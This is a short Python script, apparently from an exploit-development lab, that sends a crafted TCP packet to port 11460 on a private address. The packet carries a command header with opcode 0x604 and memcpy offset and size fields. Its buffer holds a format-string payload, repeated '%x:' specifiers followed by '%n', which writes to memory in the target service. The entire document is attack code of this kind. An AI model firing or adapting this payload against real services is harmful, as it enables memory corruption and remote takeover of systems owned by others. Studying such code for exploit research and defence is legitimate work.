#!/usr/bin/env python3

import socket
import sys
from struct import pack


def main():
    server = "192.168.185.10"
    if len(sys.argv) >= 2:
        server = sys.argv[1]

    port = 11460

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))

    # psAgentCommand
    buf = pack(">i", 0x400)
    buf += bytearray([0x41] * 0xC)
    buf += pack("<i", 0x604)  # opcode
    buf += pack("<i", 0x0)  # 1st memcpy: offset
    buf += pack("<i", 0x100)  # 1st memcpy: size field
    buf += pack("<i", 0x100)  # 2nd memcpy: offset
    buf += pack("<i", 0x100)  # 2nd memcpy: size field
    buf += pack("<i", 0x200)  # 3rd memcpy: offset
    buf += pack("<i", 0x100)  # 3rd memcpy: size field
    buf += bytearray([0x41] * 0x8)

    # psCommandBuffer
    buf += b"w00t:BBAAAA" + b"%x:" * 20
    buf += b"%n"
    buf += b"%x" * 0x6b
    buf += b"B" * 0x100
    buf += b"C" * 0x100

    # Padding
    buf += bytearray([0x41] * (0x404 - len(buf)))

    s.send(buf)
    s.close()
    sys.exit(0)


if __name__ == "__main__":
    main()